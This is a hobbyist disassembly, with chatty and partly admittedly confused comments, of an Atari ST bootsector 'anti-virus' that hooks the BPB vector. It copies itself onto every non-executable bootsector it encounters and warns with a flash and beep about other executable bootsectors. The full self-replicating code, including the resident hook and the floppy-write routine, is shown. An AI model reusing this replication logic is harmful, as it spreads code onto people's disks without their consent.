* The classic ANTIVIRUS!!! (English)
* Coded by 'HN0' (?)
* Disassembled and commented by Agrajag. (Before I got bored with it.)

* BIG IMPORTANT NOTE- I TAKE ABSOLUTELY NO RESPONSIBILITY IF YOU MUCK THE
* CODE UP AND THE CODE SUBSEQUENTELY MUCKS UP YOUR DISKS!!!

* OTHER BIG IMPORTANT NOTE - THIS IS NOT THE ORIGINAL CODE, IT WAS
* COMPLETELY DISASSEMBLED BY MYSELF!!!!

; A lot of the comments were done here before I fully understood what was
; going on, so here is a brief rundown of what goes on...
; (1) Bootsector is loaded from disk. (No programming effort needed here.)
; (2) Bootsector is copied to some safe bit in memory.
; (3) We jump to that bit of memory and re-route the BPB vector.
; (4) We return to system.

; Now I bet you want to know what the re-route of the BPB vector is all in
; aid of. (Probably not, but I'll assume you do anyway.) Well, the BPB is
; accessed every time the directory is read. SO, whenever the directory
; is read, this is what our antivirus does:
; (1) Reads the old GSX-related 1024 byte/pointer to autoexec
;     path/bootsector buffer, which is found by reading $4c6.l
; (2) Add up all the sector data. If it comes to $1234, it's a clean
;     bootsector. (? ! I thought it was supposed to do that anyway if
;     it was a proper bootsector!!!!)
; (3) If it's clean then copy itself to that bootsector.
; (4) If not, and it's not our antivirus, then flash screen, and sound
;     warning tone.

; This isn't reset-proof, but since it was not intended as a nasty virus,
; this doesn't seem too important. It can be done reasonably easily though,
; but DON'T YOU DARE!!!!!

	opt	o+,ow-			Optimisation on.

start	bra.s	code 

	dc.b	'by HN0'		Ego-trip 'loader'
	
	dc.b	'@',0 			Bootsector data.
	ds.w	1
	dc.b	$02,$02,$01,$00,$02,'p',$00,$D0
	dc.b	$02,$F9,$05,$00,$09,$00,$01,$00
	ds.w	1

* This text is in the bit which isn't used by the bootsector (as far as I
* can see.) When Fastcopy formats a disk, it stamps it's name right here!
* Now I bet you always wanted to know that, eh? No, I though not.

text1	dc.b	'This Anti-Virus beeps and f',0

code	pea     text1(pc) 		First bit of text...
	move	#9,-(a7)		(Next bit will be shown if the
	trap	#1			..program works OK!)
	lea	start(pc),a0		Get the start of the bootsector
	movea.l $4c6,a1
	lea     $600(a1),a1 		Some safe bit in memory... ($ac6?)
	movea.l	a1,a2 
	move	#$100,d0		Copy whole bootsector....
.cloop1	move	(a0)+,(a1)+
	subq	#1,d0 
	bpl.s	.cloop1 
	lea	main(pc),a0
	lea	start(pc),a1
	suba.l	a1,a0 
	adda.l  a0,a2 
	jmp	(a2)			And continue there

main	lea     oldvec(pc),a0		Save old Hd_Bpb vector
	move.l	$472,(a0) 
	lea	newvec(pc),a0		Put in new virus one!
	move.l	a0,$472
	pea	text2(pc) 		If that works, print the rest of the text.
	move	#9,-(a7)
	trap	#1
	lea	12(a7),a7 
	moveq	#$f,d0			Wait a bit....
.wait1	moveq	#-2,d1			This pause bit really pisses me off!
.wait2	dbf	d1,.wait2
	dbf	d0,.wait1
	rts 				And return to TOS...

* This is memory resident BPB vector which does all the spreading. And the
* really confused comments start right here!

newvec	link    a6,#0	Link a6 to stack with offset of 0. (I never really understood that command....)
	move	8(a6),-(a7) 		I think this is the drive no...
	movea.l	oldvec(pc),a0
	jsr	(a0)			First jump THROUGH old vector
	addq.l	#2,a7 			MMMMmmm... add a WORD value onto the stack? Somebody please tell me why??
	movem.l	a0-a1/d0-d1,-(a7) 
	movea.l	$4c6,a0 		That's some old disk buffer?
	move	#$ff,d1 		Strange....
	moveq	#0,d0 			Hmmm....
.chksum	add.w   (a0)+,d0		Now it's adding something....
	dbf     d1,.chksum		512 times... A Sector?
	cmp	#$1234,d0		Boot checksum? Oh, THAT'S what it does!
	bne.s	spread 			I assume this means a clean disk...
	movea.l	$4c6,a0 
	cmpi.l	#$60386279,(a0) 	Is it OUR antivirus?
	bne.s	flash 			No? Then flash it!
	lea	30(a0),a0
	lea	text1(pc),a1
	move.w	#$6e,d1 
.chk2	cmpm.l	(a1)+,(a0)+ 
	bne.s	flash 			Another check.....
	dbf	d1,.chk2
	bra	exit 

* The actual spreading bit.

spread	movea.l	$4c6,a0 		This is more than a GSX buffer, I can tell you...
	lea	start(pc),a1		Start of bootsector....
	move.l	(a1)+,(a0)+		Copy the BRA...
	move.l	(a1)+,(a0)+ 		..and the ego trip 'loader'
	lea	22(a0),a0		jump 34 bytes ahead for the program
	lea	text1(pc),a1		Now the program code...
	move	#$77,d1 
.cloop	move.l	(a1)+,(a0)+ 		...And copy it.
	dbf	d1,.cloop

boot	move.l	#$ffff0001,-(a7) 	Don't change format but executable
	move.l	#$1111111,-(a7) 	Random serial no
	move.l	$4c6,-(a7)		Buffer in $4c6
	move	#$12,-(a7)		Proboot
	trap	#14 

write	move	#1,-(a7)		Write one sector
	clr.l	-(a7) 			Side 0 track 0
	move	#1,-(a7)		Sector 1- the bootsector
	move	8(a6),-(a7) 		Whatever drive
	clr.l	-(a7) 			Dummy
	move.l	$4c6,-(a7)		Buffer in $4c6
	move	#9,-(a7)		Flopwr call
	trap	#14 
	lea	34(a7),a7 		Fix the stack
	bra.s	exit 

flash	movea.l	#$ff8240,a1 
	eori	#$777,(a1)		Invert colour
	movea.l	#$ff8800,a0 		Now we muck about with the sound....
	move.l	#$5000100,(a0)		BIIIIIiiiiiinnnnngggggggg.......
	move.l	#$a001000,(a0)
	move.l	#$c00a000,(a0)
	move.l	#$700fb00,(a0)
	move.l	#$d000000,(a0)
	moveq	#4,d0 			Wait a bit
.wait1	moveq   #-3,d1
.wait2	dbf     d1,.wait2
	dbf	d0,.wait1
	eori	#$777,(a1)		Restore colour

exit	movem.l	(a7)+,a0-a1/d0-d1 	Restore registers.
	unlk	a6			And a6 as well..
	rts

* The rest of the text....

text2	dc.b   'lashes',13,10
	dc.b	'if the actual bootsector is executeable',13,10
	dc.b	'then that might be a Virus!',13,10
	dc.b	'remove this anti-Virus by reset!',13,10,0

oldvec	ds.l   1
endv

* And that's it....


